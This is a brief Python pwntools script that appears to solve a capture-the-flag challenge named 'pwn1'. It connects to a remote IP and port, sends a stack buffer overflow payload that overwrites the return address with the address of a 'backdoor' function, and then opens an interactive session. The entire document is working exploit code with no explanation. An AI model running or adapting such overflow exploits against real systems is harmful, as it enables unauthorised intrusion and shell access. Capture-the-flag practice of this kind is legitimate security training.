from pwn import * 
from pwn import p64
import socket
from ctypes import *
context(arch='amd64',os = 'linux', log_level='DEBUG')

host = "node.yuzhian.com.cn"
# ip = socket.gethostbyname(host)
r = remote("223.112.5.156",51070)#远程连接
# elf = cdll.LoadLibrary("libc.so.6")
# r = process("./pwn2")
backdoor_addr = 0x00400762
payload = b'A' * 0xA0 + b'junkjunk' + p64(backdoor_addr)
r.sendlineafter(b"this is pwn1,can you do that??",payload)

r.interactive()
